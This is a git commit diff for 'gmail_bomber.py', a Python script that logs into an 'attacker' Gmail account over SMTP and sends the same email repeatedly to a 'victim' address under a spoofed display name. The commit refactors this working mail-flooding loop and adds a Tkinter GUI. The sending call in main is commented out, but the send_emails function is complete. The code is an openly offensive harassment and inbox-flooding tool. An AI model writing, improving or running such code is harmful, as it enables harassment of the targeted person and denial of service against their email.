6cba98498435a735d94176523561bc1f79eaf1de
Dennis <benjamingriller@gmail.com>
2022-10-27 23:20:39 +0200

    feat: add icon

--- gmail_bomber.py
+++ gmail_bomber.py
@@ -1,5 +1,12 @@
+import atexit
+import binascii
 import smtplib
 from email.message import EmailMessage
+from options import BomberOptions
+from res.icon import runtime_icon
+import tkinter as tk
+import tempfile
+import os
 
 #
 # Constants
@@ -8,88 +15,86 @@ from email.message import EmailMessage
 smtp_server = 'smtp.gmail.com'
 port = 587
 
-class BomberOptions(object):
-    def __init__(self, victim_address: str, email_subject: str) -> None:
-        self.__victim_address = victim_address
-        self.__email_subject = email_subject
-        
-    @property
-    def victim_address(self) -> str:
-        return self.__victim_address
-    
-    @victim_address.setter
-    def victim_address(self, address: str) -> None:
-        if not self.__is_email_address(address):
-            raise ValueError('Please enter a valid victim email address')
-        self.__victim_address = address
-        
-    @property
-    def email_subject(self) -> str:
-        return self.__email_subject
-    
-    @email_subject.setter
-    def email_subject(self, subject: str) -> None:
-        self.__email_subject = subject
-        
-    def __is_email_address(self, address: str) -> bool:
-        if address.find('@') == -1:
-            return False
-        return address.split('@')[1].find('.') == -1
+#
+# User interface
+#
 
-def set_config() -> dict:
-    attacker_adress = input('Attacker Gmail Adress: ')
-    attacker_name = input('Attacker Anonymous Name: ')
-    attacker_password = input('Attacker Gmail Password: ')
-    
-    victim_adress = input('Victim Gmail Adress: ')
-    
-    email_subject = input('Email Subject: ')
-    email_body = input('Email Message: ')
-    email_amount = int(input('Number of emails: '))
-    
-    input_data = {
-        'attacker_adress': attacker_adress,
-        'attacker_name': attacker_name,
-        'attacker_password': attacker_password,
-        'victim_adress': victim_adress,
-        'email_subject': email_subject,
-        'email_body': email_body,
-        'email_amount': email_amount
-    }
-    
-    return input_data
+def on_closing(iconfile):
+    try:
+        os.remove(iconfile.name)
+    except Exception:
+        pass
 
-def send_email(input_data: dict) -> None:
-    attacker_adress = input_data.get('attacker_adress')
-    attacker_name = input_data.get('attack_name')
-    attacker_password = input_data.get('attacker_password')
-    victim_adress = input_data.get('victim_adress')
-    email_subject = input_data.get('email_subject')
-    email_body = input_data.get('email_body')
-    email_amount = input_data.get('email_amount')
+def create_gui() -> tk.Tk:
+    root = tk.Tk()
+   
+    root.geometry("400x400")
+    root.resizable(0, 0)
+    root.title("GMail-Bomber")
+    root.configure(background = 'black')
     
+    iconfile = tempfile.NamedTemporaryFile(delete = False)
+    iconfile.write(binascii.a2b_hex(runtime_icon.iconhexdata))
+    atexit.register(lambda file = iconfile: on_closing(runtime_icon.iconhexdata))
+    
+    root.iconbitmap(iconfile.name)
+   
+    lbl_victim_address = tk.Label(root, text = 'Victim\'s address: ', bg = 'black', fg = 'white')
+    lbl_victim_address.place(x = 10, y = 15)
+    
+    txt_victim_address = tk.Text(root, bg = 'black', fg = 'white', width = 30, height = 1, insertbackground = 'white')
+    txt_victim_address.place(x = 140, y = 15)
+    
+    return root
+
+#
+# Main methods
+#
+
+def create_message(options: BomberOptions) -> EmailMessage:
+    
+    # Create email
     msg = EmailMessage()
-    msg['Subject'] = email_subject
-    msg['From'] = f'{attacker_name} <{attacker_adress}>'
-    msg['To'] = victim_adress
-    msg.set_content(email_body)
+    msg['Subject'] = options.email_subject
+    msg['From'] = f'{options.attacker_anonymous_name} <{options.attacker_gmail_address}>'
+    msg['To'] = options.victim_address
+    msg.set_content(options.email_body)
+    
+    return msg
 
+def server_login(options: BomberOptions) -> smtplib.SMTP:
+    
+    # Create smtp server
     server = smtplib.SMTP(smtp_server, port)
     server.ehlo()
     server.starttls()
     server.ehlo()
-    server.login(attacker_adress, attacker_password)
-    for i in range(email_amount):
-        server.send_message(msg)
+    
+    # Try to login
+    try:
+        server.login(options.attacker_gmail_address, options.attacker_gmail_password)
+    except smtplib.SMTPAuthenticationError:
+        raise ValueError('The password doesn\'t match the email or you don\'t have access enabled by less secure apps on Google')
+    
+    return server
+
+def send_emails(options: BomberOptions) -> None:
+    email_server = server_login(options)
+    email_message = create_message(options)
+    
+    for i in range(options.email_amount):
+        email_server.send_message(email_message)
         print(f'Sent email number {i + 1}')
-    server.quit()
+    email_server.quit()
     print('Emails have been sent successfully')
 
 def main() -> None:
-    try:
-        send_email(set_config())
-    except smtplib.SMTPAuthenticationError:
-        print('The password doesn’t match the email, or you don’t have access enabled by less secure apps on Google')
+    options = BomberOptions()
+   
+    gui = create_gui()
+    gui.mainloop()
+   
+   #send_emails(options)
 
 if __name__ == '__main__':
     main()
